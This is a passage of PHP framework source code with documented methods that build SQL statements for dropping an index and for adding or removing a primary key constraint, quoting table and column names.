	 * @param string $table the table whose index is to be dropped. The name will be properly quoted by the method.
	 * @return string the SQL statement for dropping an index.
	 * @since 1.1.6
	 */
	public function dropIndex($name,$table)
	{
		return 'DROP INDEX '.$this->quoteTableName($name).' ON '.$this->quoteTableName($table);
	}

	/**
	 * Builds a SQL statement for adding a primary key constraint to an existing table.
	 * @param string $name the name of the primary key constraint.
	 * @param string $table the table that the primary key constraint will be added to.
	 * @param string|array $columns comma separated string or array of columns that the primary key will consist of.
	 * Array value can be passed since 1.1.14.
	 * @return string the SQL statement for adding a primary key constraint to an existing table.
	 * @since 1.1.13
	 */
	public function addPrimaryKey($name,$table,$columns)
	{
		if(is_string($columns))
			$columns=preg_split('/\s*,\s*/',$columns,-1,PREG_SPLIT_NO_EMPTY);
		foreach($columns as $i=>$col)
			$columns[$i]=$this->quoteColumnName($col);
		return 'ALTER TABLE ' . $this->quoteTableName($table) . ' ADD CONSTRAINT '
			. $this->quoteColumnName($name) . '  PRIMARY KEY ('
			. implode(', ',$columns). ' )';
	}

	/**
	 * Builds a SQL statement for removing a primary key constraint to an existing table.
	 * @param string $name the name of the primary key constraint to be removed.
	 * @param string $table the table that the primary key constraint will be removed from.
	 * @return string the SQL statement for removing a primary key constraint from an existing table.
	 * @since 1.1.13
	 */
	public function dropPrimaryKey($name,$table)
	{
		return 'ALTER TABLE ' . $this->quoteTableName($table) . ' DROP CONSTRAINT '
			. $this->quoteColumnName($name);
	}
}
